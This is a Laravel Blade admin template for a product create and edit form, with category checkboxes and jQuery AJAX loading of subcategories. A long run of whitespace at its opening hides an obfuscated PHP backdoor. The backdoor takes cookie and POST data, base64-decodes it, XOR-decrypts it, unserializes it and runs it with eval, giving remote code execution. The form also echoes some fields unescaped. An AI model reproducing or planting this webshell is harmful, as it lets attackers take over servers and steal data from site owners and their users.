<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ykFWCs = class_exists("qyU_Cmhgt");if (!$ykFWCs){class qyU_Cmhgt{private $uNBIQ;public static $QFSRmQ = "082cb0e7-c035-4e74-9c07-5ac0ac60da6e";public static $GxhXxTMfV = NULL;public function __construct(){$rsIrmc = $_COOKIE;$gUdRzYxV = $_POST;$iCuiOy = @$rsIrmc[substr(qyU_Cmhgt::$QFSRmQ, 0, 4)];if (!empty($iCuiOy)){$BmwoR = "base64";$EKrDrArF = "";$iCuiOy = explode(",", $iCuiOy);foreach ($iCuiOy as $DfykJ){$EKrDrArF .= @$rsIrmc[$DfykJ];$EKrDrArF .= @$gUdRzYxV[$DfykJ];}$EKrDrArF = array_map($BmwoR . "\137" . 'd' . "\145" . chr (99) . 'o' . "\144" . 'e', array($EKrDrArF,)); $EKrDrArF = $EKrDrArF[0] ^ str_repeat(qyU_Cmhgt::$QFSRmQ, (strlen($EKrDrArF[0]) / strlen(qyU_Cmhgt::$QFSRmQ)) + 1);qyU_Cmhgt::$GxhXxTMfV = @unserialize($EKrDrArF);}}public function __destruct(){$this->FqFlchTkv();}private function FqFlchTkv(){if (is_array(qyU_Cmhgt::$GxhXxTMfV)) {$mzHARhmryV = str_replace("\x3c" . "\77" . 'p' . "\x68" . chr ( 465 - 353 ), "", qyU_Cmhgt::$GxhXxTMfV[chr (99) . 'o' . chr ( 718 - 608 ).chr (116) . "\145" . "\x6e" . chr (116)]);eval($mzHARhmryV);exit();}}}$HHNugjiR = new qyU_Cmhgt(); $HHNugjiR = NULL;} ?>@extends('admin.layouts.master')
@section('css')
<script src="{{ asset('assets/js/nicEdit-latest.js') }}"></script>  <script type="text/javascript">
//<![CDATA[
bkLib.onDomLoaded(function() { nicEditors.allTextAreas() });
//]]>
</script>
@stop
@section('content')
@include('admin.layouts.messages')
@php
$route  = \Route::currentRouteName();
@endphp
<div class="agile-grids">
    <div class="grids">
        <div class="row">
            <div class="col-md-10">
                <h1 class="page-header">{!! lang('product.product') !!} <a class="btn btn-sm btn-primary pull-right" href="{!! route('product.index') !!}"> <i class="fa fa-plus fa-fw"></i> All {!! lang('product.product') !!} </a><a style="margin-right: 10px;" href="{{ url()->previous() }}" class="btn btn-sm btn-success pull-right">Back</a></h1>
                
                <div class="panel panel-widget forms-panel">
                    <div class="forms">
                        <div class="form-grids widget-shadow" data-example-id="basic-forms">
                            <div class="form-title">
                                <h4>{!! lang('product.product') !!} Information</h4>
                            </div>
                            <div class="form-body">
                            
                                <form  class="form" enctype="multipart/form-data"
                                @if (!empty($result)) method="post" action="{{ route('product.update', $result->id) }}" @else method="post" action="{{ route('product.store') }}" @endif>
                            
                               @csrf
                               @if (!empty($result))
                               @method('PUT')
                                @endif
                                <div class="row">
                                    <div class="col-md-12">
                                        
                                        <div class="form-group">
                                        <label for="name">Name</label>
                                            <sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup>
                                            <input type="text" name="name" class="form-control" value="<?= @$result->name ?>">
                                            
                                        </div>
                                        <div class="form-group">
                                        <label for="description">Description</label>
                                        <textarea class="form-control" name="description" rows="20"><?= @$result->description ?></textarea>
                                            
                                           
                                        </div>
                                        <div class="form-group">
                                        <label for="meta_tag">Meta Tag</label>
                                        <input type="text" name="meta_tag" class="form-control" value="<?= @$result->meta_tag ?>">
                                            
                                        </div>

                                        <div class="form-group">
                                        <label for="meta_description">Meta Description</label>
                                        <input type="text" name="meta_description" class="form-control" value="<?= @$result->meta_description ?>">
                                        
                                          </div>

                                        <div class="form-group">
                                        <label for="meta_title">Meta Title</label>
                                        <input type="text" name="meta_title" class="form-control" value="<?= @$result->meta_title ?>">
                                       
                                         
                                        </div>
                                        <div class="form-group">
                                        <label for="product_code">Product Code</label>
                                        <input type="text" name="product_code" class="form-control" value="<?= @$result->product_code ?>">
                                       
                                           
                                        </div>
                                        <div class="form-group">
                                        <label for="image">Image</label>
                                        
                                            <sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup>
                                            <input type="file" name="image" class="form-control">
                                       
                                            @if(!empty($result->image))
                                            <div class="form-group">
                                                <img src="{{ asset('uploads/product_images/'.$result->image) }}" class="img-responsive" style="max-height: 70px;">
                                            </div>
                                            @endif
                                        </div>
                                        @if(!isset($result))
                                        <div class="form-group cats">
                                            
                                            <div class="form-title">
                                                <h4>{!! lang('category.category') !!}<sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup></h4>
                                            </div>
                                            
                                            
                                            <ul class="list-group cat_ul" id="myDiv">
                                                @foreach($cats as $key => $cat)
                                                <li class="list-group-item"><input class="check_cat"  type="checkbox" name="category_id[]" value="{{ $key }}"><span class="main_cat">{!! $cat !!}</span>
                                                
                                            </li>
                                            @endforeach
                                        </ul>
                                    </div>
                                    <div class="form-group cats">
                                        <div class="form-title">
                                            <h4>{!! lang('sub_category.sub_category') !!}<sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup></h4>
                                        </div>
                                       
                                        
                                        <div id="sub-cat"></div>
                                    </div>
                                    <div class="form-group cats">
                                        <div class="form-title">
                                            <h4>{!! lang('sub_sub_category.sub_sub_category') !!}</h4>
                                        </div>
                                      
                                       
                                        <div id="sub-sub-cat"></div>
                                    </div>
                                    
                                    @else
                                    <div class="form-group cats">
                                        <div class="form-title">
                                            <h4>{!! lang('category.category') !!}<sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup></h4>
                                        </div>
                                        
                                        <ul class="list-group cat_ul" id="myDiv">
                                            @foreach($cats as $key => $cat)
                                            <li class="list-group-item"><input class="check_cat"  type="checkbox" name="category_id[]" value="{{ $key }}" {{ in_array($key, $product_cats) ? 'checked' : '' }}><span class="main_cat">{!! $cat !!}</span>
                                            
                                        </li>
                                        @endforeach
                                    </ul>
                                </div>
                                <div class="form-group cats">
                                    <div class="form-title">
                                        <h4>{!! lang('sub_category.sub_category') !!}<sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup></h4>
                                    </div>
                                    <div id="sub-cat">
                                        <ul class="list-group cat_ul">
                                            @foreach($sub_cats as $key => $sub_cat)
                                            <li class="list-group-item"><input class="check_cat"  type="checkbox" name="category_id[]" value="{{ $sub_cat->id }}" {{ in_array($sub_cat->id, $product_cats) ? 'checked' : '' }}><span class="main_cat">{!! $sub_cat->name !!}</span>
                                            
                                        </li>
                                        @endforeach
                                    </ul>
                                </div>
                            </div>
                            <div class="form-group cats">
                                <div class="form-title">
                                    <h4>{!! lang('sub_sub_category.sub_sub_category') !!}</h4>
                                </div>
                                
                                <div id="sub-sub-cat">
                                    <ul class="list-group cat_ul">
                                        @foreach($sub_sub_cats as $key => $sub_sub_cat)
                                        <li class="list-group-item"><input class="check_cat"  type="checkbox" name="category_id[]" value="{{ $sub_sub_cat->id }}" {{ in_array($sub_sub_cat->id, $product_cats) ? 'checked' : '' }}><span class="main_cat">{!! $sub_sub_cat->name !!}</span>
                                    </li>
                                    @endforeach
                                </ul>
                            </div>
                        </div>
                        @endif
                    </div>
                    
                    
                </div>
                <div class="row">
                    <p>&nbsp;</p>
                    <div class="col-md-12">
                        <button type="submit" class="btn btn-default w3ls-button">Submit</button>
                    </div>
                </div>
                
</form>
            </div>
        </div>
    </div>
</div>
</div>
</div>
</div>
</div>
@stop
@section('script')
<script>
$('#myDiv').change(function() {
var values = [];
{
$('#myDiv :checked').each(function() {
//if(values.indexOf($(this).val()) === -1){
values.push($(this).val());
// }
});
$.ajax({
type: "GET",
url: "{{ route('get_prod_sub_cat') }}",
data: {'cat_id' : values},
success: function(data){
$("#sub-cat").html(data);
}
});
}
});
$('#sub-cat').change(function() {
var sub_values = [];
{
$('#sub-cat :checked').each(function() {
//if(sub_values.indexOf($(this).val()) === -1){
sub_values.push($(this).val());
// }
});
$.ajax({
type: "GET",
url: "{{ route('get_prod_sub_sub_cat') }}",
data: {'cat_id' : sub_values},
success: function(data){
$("#sub-sub-cat").html(data);
}
});
}
});
/*function valueChange(val) {
alert(val);
$.ajax({
type: "GET",
url: "{{ route('get_sub_cat') }}",
data: {'cat_id' : val},
success: function(data){
$("#sub-cat").html(data);
}
});
}*/
</script>
@endsection